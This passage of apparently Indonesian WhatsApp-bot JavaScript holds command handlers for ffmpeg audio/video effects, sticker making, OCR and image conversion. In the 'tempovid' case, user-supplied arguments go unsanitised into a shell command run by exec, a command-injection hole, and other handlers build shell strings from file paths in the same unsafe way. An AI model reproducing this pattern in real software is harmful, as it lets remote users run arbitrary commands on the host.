exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
client.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', ptt:true, quoted: mek })
fs.unlinkSync(ran)
})
break
case 'toptt':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal mengkonversi audio ke ptt')
topt = fs.readFileSync(ran)
client.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: mek, ptt:true})
})
await confirmLIMIT(sender, [angka])
break
case 'tomp3':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing) 
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('❌ Gagal, pada saat mengkonversi video ke mp3 ❌')
bufferlkj = fs.readFileSync(ran)
client.sendMessage(from, bufferlkj, audio, {mimetype: 'audio/mp4', quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break 
//Case By Luc
case 'ghostvid':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break 

case 'gemesvid':
if (!isRegistered) return sendButtonNotRegis(from)
 if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
riu = fs.readFileSync(ran)
client.sendMessage(from, riu, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'reversevid':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
 if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
client.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
fs.unlinkSync(ran)
})
break
case 'nightcorevid':
 if (!isRegistered) return sendButtonNotRegis(from)
 if (isBanned) return replysticker(banstc)
 if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
 if (!isPremium && !isOwner) return replysticker(premiumstc)
 if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'triggvid':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
if (!isPremium && !isOwner) return replysticker(premiumstc)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek })
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'bassvid': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend()) 
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
if (!isPremium && !isOwner) return replysticker(premiumstc)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'robotvid':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend()) 
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'gemukvid':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'tupaivid':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'fastvid':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
client.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
fs.unlinkSync(ran)
})
break
case 'vibravid':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
var req = args.join(' ')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=10" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, { mimetype: 'video/mp4', quoted: mek })
})
await confirmLIMIT(sender, [angka])
break
case 'slowvid':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'tempovid':
var req = args.join(' ') 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var req = args.join(' ') 
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, { mimetype: 'video/mp4', quoted: mek })
})
await confirmLIMIT(sender, [angka])
break 	
case 'stickergif':
case 'sgif':
case 'stiker': 
case 'sticker':
case 'sk':
case 's':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
replysticker(errorstc)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 10 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 10) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
replysticker(errorstc)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
  } else if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
replysticker(errorstc)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker atau reply/tag gambar(durasi sticker video 1-9 detik)`)
}
await confirmLIMIT(sender, [angka])
break
case 'stikerwm':
case 'stickerwm':
case 'swm':
case 'wm':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
pe = args.join(' ')
var a = pe.split("|")[0];
var b = pe.split("|")[1];
if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
 media = await client.downloadAndSaveMediaMessage(encmedia)
await createExif(a,b)
out = getRandom('.webp')
ffmpeg(media)
.on('error', (e) => {
console.log(e)
client.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
fs.unlinkSync(media)
})
.on('end', () => {
_out = getRandom('.webp')
spawn('webpmux', ['-set','exif','./temp/data.exif', out, '-o', _out])
.on('exit', () => {
client.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
fs.unlinkSync(out)
fs.unlinkSync(_out)
fs.unlinkSync(media)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(out) 
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
pe = args.join('')
var a = pe.split("|")[0];
var b = pe.split("|")[1];
await createExif(a,b)
out = getRandom('.webp')
ffmpeg(media)
.on('error', (e) => {
console.log(e)
client.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
fs.unlinkSync(media)
})
.on('end', () => {
_out = getRandom('.webp')
spawn('webpmux', ['-set','exif','./temp/data.exif', out, '-o', _out])
.on('exit', () => {
client.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
fs.unlinkSync(out)
fs.unlinkSync(_out)
fs.unlinkSync(media)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(out)   
} else if (isMedia && !mek.message.videoMessage || isQuotedSticker ) {
const encmedia = isQuotedSticker   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
pe = args.join('')
var a = pe.split("|")[0];
var b = pe.split("|")[1];
await createExif(a,b)
out = getRandom('.webp')
ffmpeg(media)
.on('error', (e) => {
console.log(e)
client.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
fs.unlinkSync(media)
})
.on('end', () => {
_out = getRandom('.webp')
spawn('webpmux', ['-set','exif','./temp/data.exif', out, '-o', _out])
.on('exit', () => {
client.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
fs.unlinkSync(out)
fs.unlinkSync(_out)
fs.unlinkSync(media)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(out)   
} else {
reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
}
await confirmLIMIT(sender, [angka])
break   
case 'ocr': 
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if (args.length < 0) return reply(`tag gambarnya lalu ketik ${prefix}${command}`)
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
 await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
.then(teks => {
reply(teks.trim())
fs.unlinkSync(media)
})
.catch(err => {
reply(err.message)
fs.unlinkSync(media)
})
} else {
reply(`*kirim foto dengan caption ${prefix}ocr*`)
}
await confirmLIMIT(sender, [angka])
break
case 'toimg':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if (!isPremium) return replysticker(premiumstc)
if (!isQuotedSticker) return reply('reply/tag sticker!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mediaaa = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.jpeg')
exec(`ffmpeg -i ${mediaaa} ${ran}`, (err) => {
fs.unlinkSync(mediaaa)
replysticker(waitstc)
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: Buffer.alloc(0)}).catch(() =>  replysticker(errorstc))
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break	   
case 'readmore':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`cara menggunakan nya${prefix}‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎